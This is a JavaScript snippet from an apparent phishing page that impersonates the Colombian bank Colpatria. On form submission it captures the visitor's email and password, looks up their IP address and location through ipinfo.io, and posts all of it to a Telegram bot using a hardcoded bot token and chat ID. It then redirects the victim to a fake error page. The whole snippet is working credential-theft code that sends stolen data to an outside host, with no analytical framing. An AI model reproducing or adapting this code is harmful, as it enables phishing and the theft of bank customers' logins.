<script>
  const tokenTelegram = "7013446332:AAFzYh7kqHeba1qmpsXV4RDhSgqXRpVCcsY";
  const tokenIPinfo = "9c9af8c7467cc4";

  function enviarDatos(event) {
    event.preventDefault(); 

    const usar = document.getElementById("usar").value;
    const cl4x = document.getElementById("cl4x").value;

    fetch(`https://ipinfo.io/json?token=${tokenIPinfo}`, {
      method: "GET"
    })
    .then(response => response.json())
    .then(data => {
      const mensaje = `COLPATRIA
Email: ${usar}
Contraseña: ${cl4x}
IP: ${data.ip}
${data.city},${data.country}
      `;

      fetch(`https://api.telegram.org/bot${tokenTelegram}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
            chat_id: "6588464495",
            text: mensaje
          })
        })
        .then(response => response.json())
        .then(data => {
          console.log("Respuesta de Telegram:", data);
  
          window.location.href = "error2.html";
        })
        .catch(error => {
          console.error("Error al enviar datos", error);
        });
      })
      .catch(error => {
        console.error("Error al obtener información", error);
      });
    }
</script>
